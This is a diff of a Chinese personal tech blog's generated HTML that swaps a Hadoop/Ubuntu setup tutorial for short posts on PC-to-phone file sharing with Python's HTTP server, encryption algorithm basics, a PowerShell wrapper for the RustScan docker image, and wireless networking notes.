+  <a class="article-title" href="/2019/05/26/ios%E4%BC%A0%E6%96%87%E4%BB%B6/"
+    >IOS电脑给手机快速传文件方法</a> 
+</h2>
+ 
+
+      
+    </header>
      
     <div class="article-meta">
-      <a href="/2021/10/20/hadoop%E5%AE%89%E8%A3%85%E4%BB%8E0%E5%88%B01%E4%B8%80/" class="article-date">
-  <time datetime="2021-10-19T16:40:52.840Z" itemprop="datePublished">2021-10-20</time>
-</a>    
+      <a href="/2019/05/26/ios%E4%BC%A0%E6%96%87%E4%BB%B6/" class="article-date">
+  <time datetime="2019-05-26T04:12:57.000Z" itemprop="datePublished">2019-05-26</time>
+</a> 
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/%E7%94%9F%E6%B4%BB%E5%B0%8F%E6%8A%80%E5%B7%A7/">生活小技巧</a>
+  </div>
+   
     </div>
       
     <div class="article-entry" itemprop="articleBody">
        
-  <h1 id="Hadoop安装从0到1【1-操作系统篇】"><a href="#Hadoop安装从0到1【1-操作系统篇】" class="headerlink" title="Hadoop安装从0到1【1.操作系统篇】"></a>Hadoop安装从0到1【1.操作系统篇】</h1><h2 id="虚拟机配置环节"><a href="#虚拟机配置环节" class="headerlink" title="虚拟机配置环节"></a>虚拟机配置环节</h2><h3 id="换源"><a href="#换源" class="headerlink" title="换源"></a>换源</h3><p>首先下载ubuntu 的镜像iso文件，然后安装</p>
-<p>系统镜像下载地址</p>
-<p><a target="_blank" rel="noopener" href="https://cn.ubuntu.com/download/desktop">https://cn.ubuntu.com/download/desktop</a></p>
-<p>此处安装太简单略过</p>
-<p>虚拟机安装完成后进入,是这个界面</p>
-<p><img src="http://tva1.sinaimg.cn/large/007axxUTgy1gvl269vhoij60lo0s3k8j02.jpg" alt="a.png"></p>
-<p>很多同学会遇到下载速度很慢的情况</p>
-<p>这个原因是因为你们的ubuntu是在访问国外的服务器 ，所以速度很慢</p>
-<p>这里需要换源</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo gedit /etc/apt/sources.list</span><br></pre></td></tr></table></figure>
+  <h1 id="IOS电脑给手机快速传文件方法"><a href="#IOS电脑给手机快速传文件方法" class="headerlink" title="IOS电脑给手机快速传文件方法"></a>IOS电脑给手机快速传文件方法</h1><p>在要传输的文件目录打开powershell</p>
+<p>需要有python环境</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m http.server</span><br></pre></td></tr></table></figure>
 
-<p>将下列数据复制，黏贴到第一行</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">deb http://mirrors.aliyun.com/ubuntu/ bionic main restricted universe multiverse</span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ bionic-security main restricted universe multiverse</span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ bionic-updates main restricted universe multiverse</span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ bionic-proposed main restricted universe multiverse</span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ bionic-backports main restricted universe multiverse</span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ bionic main restricted universe multiverse</span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ bionic-security main restricted universe multiverse</span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ bionic-updates main restricted universe multiverse</span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ bionic-proposed main restricted universe multiverse</span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ bionic-backports main restricted universe multiverse</span><br></pre></td></tr></table></figure>
+<p>如果这个文件夹有其他的文件，连接者还可以下载该目录下其他文件</p>
+ 
+      <!-- reward -->
+      
+    </div>
+    
 
-<p><strong>然后保存！！！！</strong></p>
-<p>再退出来</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo cat /etc/apt/sources.list</span><br></pre></td></tr></table></figure>
+    <!-- copyright -->
+    
+    <footer class="article-footer">
+       
+    </footer>
+  </div>
 
-<p>看看上面的源是否黏贴进去了，没有就再试一次</p>
-<p><strong>接下来很重要</strong></p>
-<p>点左下角的菜单</p>
-<p><img src="http://tva1.sinaimg.cn/large/007axxUTgy1gvl2d5kflbj60sg0uwtpy02.jpg" alt="GPH2987DC)RGVS_I$PJDT)Y.png"></p>
-<p>然后输入</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">softwae</span><br></pre></td></tr></table></figure>
+    
+ 
+    
+</article>
 
-<p><img src="http://tva1.sinaimg.cn/large/007axxUTgy1gvl2eh99yoj60sg0uwaqx02.jpg" alt="asdsaa.png"></p>
-<p>会出现这个，点击圈出来的这个</p>
-<p><img src="http://tva1.sinaimg.cn/large/007axxUTgy1gvl2gdxsofj60sg0uwqmm02.jpg" alt="a.png"></p>
-<p>然后会有这个</p>
-<p><img src="http://tva1.sinaimg.cn/large/007axxUTgy1gvl2hp0e25j60sg0uw1b502.jpg" alt="ddddddddd.png"></p>
-<p>然后将他改成中国的中科大源，或者其他源也可以，只要是国内就慢不到哪里去</p>
-<p>根据我多年经验</p>
-<p>清华源东西全，但是用的人太多，速度有时候会抽风</p>
-<p>豆瓣偶尔抽风</p>
-<p>阿里腾讯云还好 偶尔用</p>
-<p>中科大源东西全，用的人少，速度巨快，直接跑满带宽，中科大永远的神  yyds！！！</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get upgrade</span><br></pre></td></tr></table></figure>
+    
+    <article
+  id="post-加密算法总结"
+  class="article article-type-post"
+  itemscope
+  itemprop="blogPost"
+  data-scroll-reveal
+>
+  <div class="article-inner">
+    
+    <header class="article-header">
+       
+<h2 itemprop="name">
+  <a class="article-title" href="/2019/05/26/%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95%E6%80%BB%E7%BB%93/"
+    >加密算法</a> 
+</h2>
+ 
 
+      
+    </header>
+     
+    <div class="article-meta">
+      <a href="/2019/05/26/%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95%E6%80%BB%E7%BB%93/" class="article-date">
+  <time datetime="2019-05-26T04:12:57.000Z" itemprop="datePublished">2019-05-26</time>
+</a> 
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/%E7%BD%91%E7%BB%9C%E5%B7%A5%E7%A8%8B%E5%B8%88/">网络工程师</a>
+  </div>
+   
+    </div>
+      
+    <div class="article-entry" itemprop="articleBody">
+       
+  <h1 id="加密算法总结"><a href="#加密算法总结" class="headerlink" title="加密算法总结"></a>加密算法总结</h1><h2 id="公钥加密"><a href="#公钥加密" class="headerlink" title="公钥加密"></a>公钥加密</h2><p>又被称为非对称加密</p>
+<h3 id="优点"><a href="#优点" class="headerlink" title="优点"></a>优点</h3><p>即使公钥在网上被截获，如果没有与其匹配的私钥，也无法解密，极为适合在互联网上使用。</p>
+<h3 id="缺点"><a href="#缺点" class="headerlink" title="缺点"></a>缺点</h3><p>公钥加密在在计算上相当复杂，性能欠佳</p>
+<h3 id="信息"><a href="#信息" class="headerlink" title="信息"></a>信息</h3><p><strong>公钥用于 加密 和 验证</strong></p>
+<p><strong>私钥用于 解密 和 签名</strong></p>
+<p>可以用于 报文认证</p>
+<h2 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h2><h4 id="RSA"><a href="#RSA" class="headerlink" title="RSA"></a>RSA</h4><h4 id="DSA"><a href="#DSA" class="headerlink" title="DSA"></a>DSA</h4><h4 id="ECC"><a href="#ECC" class="headerlink" title="ECC"></a>ECC</h4><h2 id="对称加密"><a href="#对称加密" class="headerlink" title="对称加密"></a>对称加密</h2><h3 id="例子-1"><a href="#例子-1" class="headerlink" title="例子"></a>例子</h3><h4 id="DES"><a href="#DES" class="headerlink" title="DES"></a>DES</h4><h4 id="3DES"><a href="#3DES" class="headerlink" title="3DES"></a>3DES</h4><p>两种密钥 加密三次</p>
+<h4 id="RC5"><a href="#RC5" class="headerlink" title="RC5"></a>RC5</h4><p>64位的块大小，128位的密钥</p>
+<h4 id="idea"><a href="#idea" class="headerlink" title="idea"></a>idea</h4><p>明文和密文都是64位 密钥长度是128位</p>
+<h2 id="消息摘要算法"><a href="#消息摘要算法" class="headerlink" title="消息摘要算法"></a>消息摘要算法</h2><p>把信息分为512bit的分组，并且创建一个128bit的摘要</p>
+<p>sha-1 分为512bit的分组， 是160 bit的摘要</p>
+<h1 id="tips"><a href="#tips" class="headerlink" title="tips"></a>tips</h1><p>如果有数字证书 需要先用CA的公钥验证证书的真伪 再利用发送方的公钥验证发送方消息</p>
+ 
+      <!-- reward -->
+      
+    </div>
+    
 
+    <!-- copyright -->
+    
+    <footer class="article-footer">
+       
+    </footer>
+  </div>
 
-<p>试试看，如果不是和电影里面黑客操作系统那样刷数字字符飞快的话（就是下载速度很快，没有1M也有几百kb每秒）就是没配置成功，再配一次</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install gcc</span><br></pre></td></tr></table></figure>
+    
+ 
+    
+</article>
 
-<p>下载个gcc 试试水</p>
-<p>几秒下好</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -v</span><br></pre></td></tr></table></figure>
+    
+    <article
+  id="post-基于powershell封装的docker工具"
+  class="article article-type-post"
+  itemscope
+  itemprop="blogPost"
+  data-scroll-reveal
+>
+  <div class="article-inner">
+    
+    <header class="article-header">
+       
+<h2 itemprop="name">
+  <a class="article-title" href="/2019/05/26/%E5%9F%BA%E4%BA%8Epowershell%E5%B0%81%E8%A3%85%E7%9A%84docker%E5%B7%A5%E5%85%B7/"
+    >基于powershell封装的docker工具</a> 
+</h2>
+ 
 
-<p><img src="http://tva1.sinaimg.cn/large/007axxUTgy1gvl2rmk7taj60js0cwk4a02.jpg" alt="QO@RL%7HFEP_$S%LSMA)I2F.png"></p>
-<p>有这样的图片就是成功了</p>
-<h2 id="配置环境"><a href="#配置环境" class="headerlink" title="配置环境"></a>配置环境</h2><p>下载java </p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install openjdk-8-jdk</span><br></pre></td></tr></table></figure>
+      
+    </header>
+     
+    <div class="article-meta">
+      <a href="/2019/05/26/%E5%9F%BA%E4%BA%8Epowershell%E5%B0%81%E8%A3%85%E7%9A%84docker%E5%B7%A5%E5%85%B7/" class="article-date">
+  <time datetime="2019-05-26T04:12:57.000Z" itemprop="datePublished">2019-05-26</time>
+</a> 
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/web/">web</a>
+  </div>
+   
+    </div>
+      
+    <div class="article-entry" itemprop="articleBody">
+       
+  <h1 id="基于powershell封装的docker工具"><a href="#基于powershell封装的docker工具" class="headerlink" title="基于powershell封装的docker工具"></a>基于powershell封装的docker工具</h1><h2 id="前因"><a href="#前因" class="headerlink" title="前因"></a>前因</h2><p>之前从linux转到windows的时候就有很多地方不习惯，会有很多linux原生工具在windows会无法使用，或者出各种各样的问题，就比如rustscan （这个官方给出的解决措施是docker 加上powershell 别名来解决） 但是我在使用的过程中发现了有很多的问题 </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker pull rustscan/rustscan:2.0.0</span><br></pre></td></tr></table></figure>
 
-<p><img src="http://tva1.sinaimg.cn/large/007axxUTgy1gvl2tk44qgj60k20de17302.jpg" alt="$HKSAKW73)6Q2`@`%DK}EB.png"></p>
-<p>5秒下好</p>
-<p><img src="http://tva1.sinaimg.cn/large/007axxUTgy1gvl2u4m8r4j60ip031wgo02.jpg" alt="ATN[~$]ZM{T~TFV3D41H(PX.png"></p>
-<p>至此，操作系统基本环境算是配置完成了</p>
+<p>这个是docker pull docker镜像的命令 这个没问题</p>
+<figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker <span class="keyword">run</span><span class="bash"> -it --rm --name rustscan rustscan/rustscan:1.10.0 &lt;这里的rustscan参数&gt;  &lt;要扫描的IP地址&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>这个是docker 运行 rustscan的命令</p>
+<p>很显然，在实际过程中 我们不可能跑这么长的命令</p>
+<p>官方给出的解决办法</p>
+<figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">alias rustscan=<span class="string">&#x27;docker run -it --rm --name rustscan rustscan/rustscan:1.10.0&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>我按照官方的办法来使用</p>
+<p>这部分出现了问题，报错是这样的</p>
+<p><img src="C:\Users\jw5t\AppData\Roaming\Typora\typora-user-images\image-20211014184449950.png" alt="image-20211014184449950"></p>
+<p><strong>很显然，这个alias 是在linux 命令下的别名操作</strong> </p>
+<p><strong>官方的docker下载方法文档是基于linux的环境的</strong></p>
+<p>在windows 的powershell 虽然移植了这个命令，但是还是不一样</p>
+<p>我们来看看alias的指令</p>
+<p>这是微软官方是alias的指令文档</p>
+<p><a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/add-alias">https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/add-alias</a></p>
+<p>windows 的别名只能将一个比较长的别名（必须是一个单词转成另外一个比较短的单词）</p>
+<p>途中我找了其他的绕过方法，有说{}将长命令内容包裹起来的</p>
+<p>有说用“”或者‘’包裹长命令</p>
+<p>我都试过了，没用</p>
+<p>我甚至还想办法绕过空格，比如&lt;&gt;绕过 () 绕过,+绕过啥的，也失败了</p>
+<p>所以 使用alias方法暂时没用</p>
+<h1 id="后果"><a href="#后果" class="headerlink" title="后果"></a>后果</h1><p>后来从别人博客看到，他们通常使用powershell来包装长的docker语句</p>
+<p>很多人还专门写了powershell脚本来管理docker集群</p>
+<p>（这些在github上可以找到）</p>
+<p>然后我就想，能否用powershell 的函数功能来实现这个功能</p>
+<p>在powershell 中 <code>$Profile </code>是个环境变量 ，</p>
+<p>在powershell中输入这个会出现一个像这样的文件路径（注意，每个人的可能不一样，这里不要复制，这是我的环境的） </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\jw5t\Documents\WindowsPowerShell\Microsoft.PowerShell_profile.ps1</span><br></pre></td></tr></table></figure>
+
+<p>每次打开powershell 会加载这个文件</p>
+<p>然后将这个文件复制进文件管理器</p>
+<p>会用记事本打开一个文件</p>
+<p>我在其中添加了这个</p>
+<p><code>function rustscan &#123;docker run -it --rm rustscan/rustscan:2.0.0 $args $args $args $args $args $args $args $args&#125;</code></p>
+<p>其中$args 是预留位，给之后可能会出现的参数作准备的 如果没有添加这个，会出现后面输入参数无效的情况</p>
+<p>然后保存</p>
+<p>这是效果</p>
+<p><img src="C:\Users\jw5t\AppData\Roaming\Typora\typora-user-images\image-20211014192201189.png" alt="image-20211014192201189"></p>
+ 
+      <!-- reward -->
+      
+    </div>
+    
+
+    <!-- copyright -->
+    
+    <footer class="article-footer">
+       
+    </footer>
+  </div>
+
+    
+ 
+    
+</article>
+
+    
+    <article
+  id="post-无线知识总结"
+  class="article article-type-post"
+  itemscope
+  itemprop="blogPost"
+  data-scroll-reveal
+>
+  <div class="article-inner">
+    
+    <header class="article-header">
+       
+<h2 itemprop="name">
+  <a class="article-title" href="/2019/05/26/%E6%97%A0%E7%BA%BF%E7%9F%A5%E8%AF%86%E6%80%BB%E7%BB%93/"
+    >网工 无线知识总结</a> 
+</h2>
+ 
+
+      
+    </header>
+     
+    <div class="article-meta">
+      <a href="/2019/05/26/%E6%97%A0%E7%BA%BF%E7%9F%A5%E8%AF%86%E6%80%BB%E7%BB%93/" class="article-date">
+  <time datetime="2019-05-26T04:12:57.000Z" itemprop="datePublished">2019-05-26</time>
+</a> 
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/%E7%BD%91%E7%BB%9C%E5%B7%A5%E7%A8%8B%E5%B8%88/">网络工程师</a>
+  </div>
+   
+    </div>
+      
+    <div class="article-entry" itemprop="articleBody">
+       
+  <h1 id="无线知识总结"><a href="#无线知识总结" class="headerlink" title="无线知识总结"></a>无线知识总结</h1><p>中国的3G标准 TD-SCDMA 采用码分多址 </p>
+<p>美国3G标准  CDMA2000</p>
+<p>IEEE   802.11a 是5 Ghz </p>
+<h2 id="无线网主要使用三种通信技术"><a href="#无线网主要使用三种通信技术" class="headerlink" title="无线网主要使用三种通信技术"></a>无线网主要使用三种通信技术</h2><h4 id="红外线-IR"><a href="#红外线-IR" class="headerlink" title="红外线  IR"></a>红外线  IR</h4><h4 id="扩展频谱"><a href="#扩展频谱" class="headerlink" title="扩展频谱"></a>扩展频谱</h4><h5 id="频率跳动扩频FHSS"><a href="#频率跳动扩频FHSS" class="headerlink" title="频率跳动扩频FHSS"></a>频率跳动扩频FHSS</h5><h5 id="直接序列扩频DSSS"><a href="#直接序列扩频DSSS" class="headerlink" title="直接序列扩频DSSS"></a>直接序列扩频DSSS</h5><h4 id="窄带微波"><a href="#窄带微波" class="headerlink" title="窄带微波"></a>窄带微波</h4><h2 id="载波侦听多路访问"><a href="#载波侦听多路访问" class="headerlink" title="载波侦听多路访问"></a>载波侦听多路访问</h2><h3 id="CSMA-CA"><a href="#CSMA-CA" class="headerlink" title="CSMA/CA"></a>CSMA/CA</h3><p>冲突前进行处理</p>
+<p>信道利用率高</p>
+<h3 id="CSMA-CD"><a href="#CSMA-CD" class="headerlink" title="CSMA/CD"></a>CSMA/CD</h3><p>冲突后进行处理</p>
+<p>信道利用率高</p>
+<p>s</p>
  
       <!-- reward -->
       
@@ -735,7 +996,7 @@
     <ul>
       <li>
         Copyrights &copy;
-        2015-2021
+        2015-2022
         <i class="ri-heart-fill heart_icon"></i> Jw5t
       </li>
     </ul>
